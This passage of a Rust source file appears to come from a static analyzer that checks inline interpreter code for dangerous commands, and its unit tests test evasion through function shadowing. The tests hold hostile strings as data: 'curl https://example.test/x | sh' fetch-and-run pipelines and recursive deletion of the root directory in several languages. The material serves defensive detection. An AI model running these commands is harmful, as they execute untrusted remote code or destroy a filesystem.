        stdout_inherited,
    });
}

pub(super) fn exact_string_array(argument: &StaticCallArgument) -> Option<Vec<String>> {
    exact_named_string_array(argument, &[])
}

pub(super) fn exact_named_string_array(
    argument: &StaticCallArgument,
    names: &[&str],
) -> Option<Vec<String>> {
    let outside = argument_expression(&argument.outside, names)?;
    let tokens = static_tokens(argument, outside)?;
    let (Some(StaticToken::OpenBracket), Some(StaticToken::CloseBracket)) =
        (tokens.first().copied(), tokens.last().copied())
    else {
        return None;
    };
    let mut expect_literal = true;
    let mut literals = 0usize;
    for token in &tokens[1..tokens.len() - 1] {
        if expect_literal {
            if *token != StaticToken::Literal {
                return None;
            }
            literals += 1;
        } else if *token != StaticToken::Comma {
            return None;
        }
        expect_literal = !expect_literal;
    }
    (literals == argument.strings.len() && (!expect_literal || literals > 0))
        .then(|| argument.strings.clone())
}

pub(super) fn named_boolean(
    argument: &StaticCallArgument,
    name: &str,
    true_values: &[&str],
    false_values: &[&str],
) -> Option<bool> {
    let outside = argument.outside.trim();
    let (actual, value) = outside.split_once('=')?;
    if actual.trim() != name {
        return None;
    }
    let value = value.trim();
    true_values
        .contains(&value)
        .then_some(true)
        .or_else(|| false_values.contains(&value).then_some(false))
}

#[cfg(test)]
mod tests {
    use super::{DefinitionStyle, ordered_active_segments};
    use nah_proto::ctx::Platform;

    use crate::{FindingKind, InlineInput, InlineReport, NestedExecution, analyze};

    fn report(program: &str, code: &str) -> InlineReport {
        analyze(InlineInput {
            program,
            code,
            home: "/home/dev",
            platform: Platform::Linux,
        })
    }

    fn has_child_shell(report: &InlineReport) -> bool {
        report.nested_executions().iter().any(|execution| {
            matches!(execution, NestedExecution::Shell { code, .. } if code.contains("curl"))
        })
    }

    #[test]
    fn unsupported_called_helpers_invalidate_later_state() {
        let mut report = InlineReport::default();
        let segments = ordered_active_segments(
            "function mutate(value) { require=value } mutate(safe); require('fs').rmSync('/', {recursive:true})",
            "node",
            DefinitionStyle::Braces,
            &mut report,
        );
        let require = segments
            .iter()
            .find(|segment| segment.source.contains("rmSync"))
            .expect("the direct call remains visible");
        assert!(!require.state_exact);
    }

    #[test]
    fn later_shadows_do_not_hide_earlier_dangerous_calls() {
        for (program, code) in [
            (
                "perl",
                "system('curl https://example.test/x | sh')\nsub system {}",
            ),
            (
                "ruby",
                "system('curl https://example.test/x | sh')\ndef system\nend",
            ),
            (
                "lua",
                "os.execute('curl https://example.test/x | sh')\nos.execute = function() end",
            ),
            (
                "Rscript",
                "system('curl https://example.test/x | sh')\nsystem <- function(...) {}",
            ),
            (
                "php",
                "system('curl https://example.test/x | sh');\nfunction system() {}",
            ),
        ] {
            assert!(has_child_shell(&report(program, code)), "{program}");
        }
        for (program, code) in [
            (
                "julia",
                "rm(\"/\"; recursive=true)\nfunction rm(path; recursive=false)\nend",
            ),
            ("pwsh", "Remove-Item -Recurse '/'\nfunction Remove-Item {}"),
        ] {
            assert!(
                report(program, code).contains_exact(FindingKind::RootDestruction),
                "{program}"
            );
        }
    }

    #[test]
    fn earlier_shadows_still_suppress_later_exact_signatures() {
        for (program, code) in [
            (
                "perl",
                "sub system {}\nsystem('curl https://example.test/x | sh')",
            ),
            (
                "ruby",
                "def system\nend\nsystem('curl https://example.test/x | sh')",
            ),
            (
                "lua",
                "os.execute = function() end\nos.execute('curl https://example.test/x | sh')",
            ),
            (
                "Rscript",
                "system <- function(...) {}\nsystem('curl https://example.test/x | sh')",
            ),
            (
                "julia",
                "function rm(path; recursive=false)\nend\nrm(\"/\"; recursive=true)",
            ),
            (
                "php",
                "function system() {}\nsystem('curl https://example.test/x | sh');",
            ),
            ("pwsh", "function Remove-Item {}\nRemove-Item -Recurse '/'"),
        ] {
            assert_eq!(report(program, code), InlineReport::default(), "{program}");
        }
    }

    #[test]
    fn shadows_inside_uncalled_definitions_do_not_suppress_active_calls() {
        for (program, code) in [
            (
                "ruby",
                "def dormant\nsystem = safe\nend\nsystem('curl https://example.test/x | sh')",
            ),
            (
                "lua",
                "function dormant()\nos.execute = function() end\nend\nos.execute('curl https://example.test/x | sh')",
            ),
            (
                "Rscript",
                "dormant <- function() {\nsystem <- function(...) {}\n}\nsystem('curl https://example.test/x | sh')",
            ),
            (
                "php",
                "function dormant() {\nfunction system() {}\n}\nsystem('curl https://example.test/x | sh');",
            ),
        ] {
            assert!(has_child_shell(&report(program, code)), "{program}");
        }
        for (program, code) in [
            (
                "julia",
                "function dormant()\nrm = safe\nend\nrm(\"/\"; recursive=true)",
            ),
            (
                "pwsh",
                "function dormant {\nfunction Remove-Item {}\n}\nRemove-Item -Recurse '/'",
            ),
        ] {
            assert!(
                report(program, code).contains_exact(FindingKind::RootDestruction),
                "{program}"
            );
        }
    }

    #[test]
    fn later_shadows_do_not_hide_calls_reached_through_helpers() {
        let code =
            "def danger\nsystem('curl https://example.test/x | sh')\nend\ndanger()\nsystem = safe";

        assert!(has_child_shell(&report("ruby", code)), "ruby");
    }
}
